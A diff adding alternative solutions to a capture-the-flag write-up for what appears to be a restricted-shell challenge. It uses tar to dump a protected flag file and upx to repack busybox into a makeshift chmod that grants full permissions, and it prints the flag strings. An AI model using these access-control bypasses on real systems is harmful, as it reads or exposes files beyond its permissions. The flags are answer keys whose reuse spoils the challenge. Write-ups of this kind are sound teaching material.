@@ -148,3 +148,47 @@ FLAG:
 ```
 CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
 ```
+
+# Alternative Solutions
+
+With a challenge like this with the huge number of different binaries and all their sub-options there is bound to be more than one way to complete the challenge. Here I will document any other solutions and their authors.
+
+## Alternative Main Solutions
+
+### tar
+Credit: [madushan1000](https://github.com/madushan1000)
+
+`tar` can be used to print out the flag as it is being compressed into a archive.
+
+Running: 
+```
+tar cvf - README.flag
+```
+
+Will produce the output:
+```
+README.flag0000400000247200024720000000003413504135746010423 0ustar  13381338README.flag
+CTF{4ll_D474_5h4ll_B3_Fr33}
+```
+
+## Alternative Bonus Solutions
+
+### upx
+Credit: [madushan1000](https://github.com/madushan1000)
+
+On the machine is the binay `upx`. This is used to pack binaries, however this can be used to pack `busybox` into a frakenstien `chmod` binary that will allow us to change the permissions of the `ORME.flag`.
+
+Running:
+```
+upx  -ochmod /bin/busybox
+```
+
+Will create us a file called `chmod` that when executed can be used like the official tool.
+
+Same as above running:
+
+```
+./chmod 777 ORME.flag
+```
+
+Will change the permissions and allow us to view the file!
